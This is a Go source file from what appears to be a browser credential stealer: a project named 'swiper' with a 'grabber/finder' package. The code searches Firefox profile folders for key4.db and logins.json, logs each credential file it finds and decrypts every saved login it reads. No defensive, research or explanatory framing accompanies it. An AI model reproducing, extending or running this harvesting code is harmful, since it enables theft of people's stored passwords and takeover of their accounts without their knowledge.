package finder

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"swiper/grabber/finder/decrypter"
	"swiper/models"
)

type finder struct {
	path           string
	masterPassword []byte
	dec            models.IDecrypter
}

func New(path string, masterPassword []byte) *finder {
	return &finder{
		path:           path,
		masterPassword: masterPassword,
		dec:            decrypter.New(),
	}
}

func (f *finder) FindKeys() ([]models.Login, error) {
	path, err := f.getDir()
	if err != nil {
		return nil, err
	}
	return f.collectData(path, f.masterPassword)
}

//Find subdirectories with profile data
func (f *finder) getDir() (map[string]string, error) {
	dir, err := ioutil.ReadDir(f.path)
	if err != nil {
		return nil, err
	}

	ret := map[string]string{}

	for _, v := range dir {
		path := fmt.Sprintf(`%s\%s`, f.path, v.Name())
		if f.path[len(f.path)-1] == '\\' || f.path[len(f.path)-1] == '/' {
			path = fmt.Sprintf(`%s%s`, f.path, v.Name())
		}
		key, login, err := f.searchFiles(path)
		if err != nil {
			return nil, err
		}
		if key != "" {
			ret[key] = login
		}
	}
	return ret, nil
}

//get data from files and decrypt it with Decrypt() func
func (f *finder) collectData(paths map[string]string, masterPassword []byte) ([]models.Login, error) {
	ret := make([]models.Login, 0, 10)
	for k, v := range paths {
		data, err := ioutil.ReadFile(v)
		if err != nil {
			return nil, err
		}
		tmp := models.FirefoxLogin{}
		if err := json.Unmarshal(data, &tmp); err != nil {
			return nil, err
		}
		db, err := sql.Open("sqlite3", k)
		if err != nil {
			return nil, err
		}

		for _, elem := range tmp.Logins {
			login, err := f.dec.Decrypt(db, elem, masterPassword)
			if err != nil {
				return nil, err
			}

			ret = append(ret, login)
		}
	}
	return ret, nil
}

//returns key4.db and logins.json file for each directory
func (f *finder) searchFiles(path string) (string, string, error) {
	var key, login string
	k := regexp.MustCompile(`.*key4\.db`)
	l := regexp.MustCompile(`.*logins\.json`)
	if err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if k.MatchString(path) {
			log.Println(fmt.Sprintf(`File with keys found at "%s"`, path))
			key = path
		}
		if l.MatchString(path) {
			log.Println(fmt.Sprintf(`File with creds found at "%s"`, path))
			login = path
		}
		return nil
	}); err != nil {
		return "", "", err
	}
	return key, login, nil
}
